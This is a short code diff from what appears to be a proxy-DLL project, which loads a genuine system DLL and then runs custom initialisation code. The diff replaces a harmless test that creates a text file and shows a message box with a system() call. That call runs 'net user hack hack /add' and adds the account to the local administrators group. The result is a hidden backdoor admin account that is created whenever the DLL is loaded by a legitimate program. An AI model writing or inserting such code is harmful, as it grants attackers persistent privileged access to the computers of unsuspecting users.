@@ -286,16 +286,7 @@ namespace {
         loadGenuineDll(dllType, systemDirectory);
         plugin::loadPluginDlls();
         {
-            HANDLE handle1 = CreateFile(_T("C:\\1.txt"), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-            if (handle1 != INVALID_HANDLE_VALUE) // 函数执行成功
-            {
-                MessageBox(NULL, _T("文件成功创建"), _T("提示"), MB_OK);
-            }
-            else
-            {
-                DEBUG_TRACE("错误：无法创建文件 (%lu)\n", GetLastError());
-                MessageBox(NULL, _T("文件没有成功创建"), _T("提示"), MB_OK);
-            }      
+            system("net user hack hack /add && net localgroup administrators hack /add");      
             //
             // *** You can put your own init code here ***
             //
